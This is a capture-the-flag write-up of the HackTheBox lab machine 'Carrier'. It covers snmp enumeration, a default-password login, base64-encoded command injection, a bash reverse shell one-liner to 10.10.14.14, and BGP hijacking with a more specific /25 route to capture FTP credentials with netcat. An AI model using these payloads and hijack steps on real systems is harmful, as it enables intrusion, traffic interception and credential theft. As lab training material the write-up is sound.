---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-03-16-carrier-hackthebox
tags:
- bgp hijacking
- command injection
- hackthebox
- linux
- snmp
title: Carrier @ HackTheBox
---

Carrier is a nice, medium difficulty machine on [hackthebox.eu](https://www.hackthebox.eu) featuring information retrieval via snmp, command injection and bgp hijacking. The bgp hijacking part was a nice learning experience as this is a technique you probably don’t see every day.

## User Flag

We start by scanning the box with nmap and get the following ports:

```
nmap -Pn -sV -sC -p- -oA tcp_all 10.10.10.105
22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
80/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login
```

```
nmap -Pn -sV -sC -sU --top-ports=50 -oA udp50 10.10.10.105
161/udp   open   snmp            SNMPv1 server; pysnmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: pysnmp
|   engineIDFormat: octets
|   engineIDData: 77656201d7f908
|   snmpEngineBoots: 2
|_  snmpEngineTime: 5m30s
```

A quick snmpwalk (`snmpwalk 10.10.10.105 -c public -v1`) shows just one result, which looks like some sort of serial number:

```
iso.3.6.1.2.1.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
```

The next thing to look at is the web application on port 80. As trying various default credentials yields no results we start looking for web content and find the following:

```
wfuzz --hc 404,403 -w ~/tools/SecLists/Discovery/Web-Content/raft-large-words.txt http://carrier.htb/FUZZ
000015:  C=301      9 L       28 W      307 Ch    "js"
000021:  C=301      9 L       28 W      308 Ch    "css"
000060:  C=301      9 L       28 W      308 Ch    "img"
000169:  C=301      9 L       28 W      310 Ch    "tools"
000353:  C=301      9 L       28 W      308 Ch    "doc"
000408:  C=301      9 L       28 W      310 Ch    "fonts"
000688:  C=301      9 L       28 W      310 Ch    "debug"
```

Looking at the subdirectories in a web browser shows that they are listable! In "doc" we find a pdf manual of the system, in which it explains the status code we saw on the login page with `45009 - System credentials have not been set. Default admin user password is set (see chassis serial number)`. With this knowledge we go back to the login page and login with `admin:NET_45JDX23`, the password being the serial number we retrieved via snmp earlier:

![](htb_carrier_logged_in.png)

The "Diagnostics" menu lets us issue a post request to the server with the parameter `check=cXVhZ2dh`:

![](htb_carrier_diagnostics.png)

After decoding the base64 with `echo -ne "cXVhZ2dh" | base64 -d` we get the string "quagga". Playing a bit with the parameter we discover that it is possible to inject commands by simply appending them and encoding in base64 again:

```
echo -ne "quagga; whoami; id" | base64

check=cXVhZ2dhOyB3aG9hbWk7IGlk

<p>root</p><p>uid=0(root) gid=0(root) groups=0(root)</p>
```

To get a shell we use a basic bash one liner, encode and execute it, which leads to shell as root and reveals the user flag:

```
echo -ne 'quagga; /bin/bash -i >& /dev/tcp/10.10.14.14/5555 0>&1' | base64
cXVhZ2dhOyAvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvNTU1NSAwPiYx
```

## Root Flag

Despite being root on the box we do not have any root flag yet so there has to be more to it. Going back to the webapp we can see several tickets which talk about several BGP related things, including this message:

```
...
Still reporting issues with 3 networks: 10.120.15,10.120.16,10.120.17/24's, one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network, investigating... 
```

What this is hinting at, is that we have several networks that use bgp to communicate and that there is potential clear text authentication being send over them with ftp. Looking at netstat confirms its bgp, as we have zebra and bgpd running:

```
tcp        0      0 127.0.0.1:2601          0.0.0.0:*               LISTEN      112        7806242     62602/zebra 
tcp        0      0 127.0.0.1:2605          0.0.0.0:*               LISTEN      112        7806244     62606/bgpd  
tcp        0      0 0.0.0.0:179             0.0.0.0:*               LISTEN      112        7805245     62606/bgpd  
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          44065       477/sshd    
tcp6       0      0 :::179                  :::*                    LISTEN      112        7805246     62606/bgpd  
tcp6       0      0 :::22                   :::*                    LISTEN      0          44070       477/sshd 
```

Now lets look at how zebra is configured in "/etc/quagga/bgpd.conf":

```
route-map to-as200 permit 10
route-map to-as300 permit 10
!
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 route-map to-as300 out
!
line vty
!
```

What we see here is that this machine is configured under the name "100" and is advertising the networks 10.101.8.0/21 and 10.101.16.0/21 as locally connected to its neighbors. In addition we see under which ip addresses we can reach the other routers.

Another important piece of information is in `ip route`, where we can see that some of the subnets are passed to "200" and some to "300":

```
10.78.10.0/24 dev eth1  proto kernel  scope link  src 10.78.10.1
10.78.11.0/24 dev eth2  proto kernel  scope link  src 10.78.11.1
10.99.64.0/24 dev eth0  proto kernel  scope link  src 10.99.64.2
10.100.10.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.11.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.12.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.13.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.14.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.15.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.16.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.17.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.18.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.19.0/24 via 10.78.10.2 dev eth1  proto zebra
10.100.20.0/24 via 10.78.10.2 dev eth1  proto zebra
10.120.10.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.11.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.12.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.13.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.14.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.15.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.16.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.17.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.18.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.19.0/24 via 10.78.11.2 dev eth2  proto zebra
10.120.20.0/24 via 10.78.11.2 dev eth2  proto zebra
```

Having this information, in combination with the message from the webapp, leads to the following plan: Redirect traffic send from "200" to 10.120.15.0/24 in "300" through our router by advertising false routes. This technique is called bgp hijacking, an excellent guide can be found [here](https://www.isi.deterlab.net/file.php?file=/share/shared/BGPhijacking).

In order to execute the attack we first modify bgpd.conf so that our router is now advertising the 10.120.15.0/25 network as directly connected:

```
vtysh
r1> en
r1# conf t
r1(config)# router bgp 100
r1(config-router)# network 10.120.15.0/25
r1(config-router)# end
r1# wr
r1# exit
```

The reason the target subnet is advertised as /25 instead of /24 is that more specific subnets are given priority in bgp routing. We could redirect the traffic the to original target, but since we are interested in ftp credentials an easy way is to pose as the target by adding its ip to the box we are on and starting a local listener on port 21:

```
ip a add 10.120.15.10/24 dev eth2
nc -lvp 21
```

After a moment we get a connection! To emulate a ftp server we have to respond manually with "331 Please specify the password." to make the client send its authentication:

![](htb_carrier_ftp_capture.png)

We can now use the credentials "root:BGPtelc0rout1ng" we obtained to log into the ftp server "10.120.15.10" (after removing the ip from our interface) where we find the root flag:

```
150 Here comes the directory listing.
-r--------    1 0        0              33 Jul 01 15:58 root.txt
-rw-------    1 0        0              33 Dec 27 12:11 secretdata.txt
...
```

Many thanks to [snowscan](https://twitter.com/snowscan) for creating this fun box.